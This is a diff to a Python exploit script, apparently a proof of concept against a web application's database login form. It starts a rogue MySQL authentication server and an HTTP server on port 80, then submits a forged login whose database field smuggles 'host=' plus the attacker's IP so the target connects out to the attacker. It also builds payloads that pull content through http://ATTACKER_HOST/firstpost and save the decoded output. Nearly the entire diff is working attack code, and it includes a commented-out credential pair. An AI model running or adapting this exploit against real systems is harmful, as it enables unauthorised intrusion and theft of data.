@@ -8,11 +8,22 @@ from bs4 import BeautifulSoup
 import threading
 import base64
 import sys
+import pprint
+
+try:
+    ATTACKER_HOST = sys.argv[1]
+    ATTACK_DBSTR = "cryptor; host=" + ATTACKER_HOST
+except IndexError:
+    print("Usage: " + sys.argv[0] + "<YOUR IP ADDR>")
+    sys.exit(1)
 
 
 def callfakeserv():
+    if os.getuid() != 0:
+        print("This script need ROOT privilegegs to open a http server listens on 80.")
+        sys.exit(2)
     subprocess.Popen(["python3", "MySQL-Auth-Server/MySQL-Auth-Server.py"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
-
+    subprocess.Popen(["python3", "onekeyhttpserver.py", "80"])
 
 def interact():
     session = requests.session()
@@ -38,13 +49,32 @@ def interact():
     try:
         req = session.get(baseurl_index)
         token = parse_to_get(req.content, "input", {"name": "token"}, True)
+        data = {
+            # "username": "dbuser",
+            # "password": "krypt0n1te",
+            "username": "fuckyou",
+            "password": "killyou",
+            "db": ATTACK_DBSTR,
+            "token": "{}".format(token),
+            "login": ""
+        }
 
-
+        getdata1 = session.post(baseurl_index, data=data)
+        getdata2 = build_payload("http://127.0.0.1/dev/index.php",data)
+        write_data_to_fd("firstpost", "w", base64.b64decode(getdata2))
+        usr_storage = "http://" + ATTACKER_HOST + "/firstpost"
+        getdata3 = build_payload(usr_storage, data)
+        write_data_to_fd("secondsend.html", "w", base64.b64decode(getdata3))
+        with open("secondsend.html", "r") as fd2:
+            pprint.pprint(fd2.read())
+    except:
+        print("Error detected!")
 
 
 def main():
-    if os.path.isdir("MySQL-Auth-Server"):
-        pass
+    if os.path.isdir("MySQL-Auth-Server") and os.path.isfile("onekeyhttpserver.py"):
+        operation1 = threading.Thread(target=callfakeserv()).start()
+        operation2 = threading.Thread(target=interact()).start()
     else:
         print("Dependencies not exist, please clone the whole repo.")
         sys.exit(1)
